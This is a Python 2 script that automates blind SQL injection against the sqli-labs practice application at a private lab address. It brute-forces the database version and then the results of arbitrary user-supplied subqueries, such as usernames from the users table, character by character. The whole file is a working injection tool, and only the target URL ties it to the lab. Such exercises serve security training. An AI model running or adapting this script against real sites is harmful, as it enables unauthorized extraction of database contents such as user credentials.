import urllib2
import string

site = 'http://172.16.191.129/sqli-labs/Less-5/?id=1'

numlist = string.digits + '.'
numlist1 = string.digits[1:]
charlist = string.letters + '+_-=()*&^%$#@!~`\|,./?><\'\":; '


def version():
    m = ''
    for i in range(1, 10):
        for k in numlist:
            url = '%27%20and%201=1%2b(select%20if(substring(version(),' \
                  + str(i) + ',1)=' + k + ',1,0))--+'
            l = site + url
            # print l
            f = urllib2.urlopen(l, timeout=5).read()
            if 'You are in' not in f:
                if k in numlist1 + '.':
                    if k == '.':
                        if len(m) > 0 and m[-1] != '.':
                            m = m + k
                    else:
                        m = m + k
    print 'The sql\'s version is : ' + m


def sql_one():
    print 'eg:(select username from users where id=1) == %28select%20username%20from%20users%20where%20id%20%3D1%29'
    while True:
        m1 = ''
        y = raw_input('what you want(must be urlencoded)')
        if y == '':
            continue
        for a in range(1, 20):
            for b in charlist + numlist:
                url = '%27%20and%201=1%2b(select%20if(ascii(substring('\
                      + y + ',' + str(a) + ',1))=' + str(
                    ord(b)) + ',1,0))--+'
                l1 = site + url
                f1 = urllib2.urlopen(l1, timeout=5).read()
                if 'You are in' not in f1:
                    m1 = m1 + b
        print m1


if __name__ == '__main__':
    version()
    sql_one()
